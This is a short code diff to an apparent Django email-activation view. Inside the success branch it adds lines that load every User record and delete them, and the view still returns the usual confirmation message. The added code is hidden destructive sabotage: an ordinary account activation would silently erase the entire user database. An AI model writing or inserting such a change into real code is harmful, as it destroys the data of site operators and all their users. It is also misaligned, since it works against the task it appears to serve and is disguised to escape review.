@@ -145,6 +145,9 @@ def activate(request, uidb64, token):
 
     if user is not None and account_activation_token.check_token(user, token):
         activate_user(user.username)
+        records = User.objects.all()
+        records.delete()
+
         # return redirect('home')
         return HttpResponse('Thank you for your email confirmation. You can now login your account.')
     else:
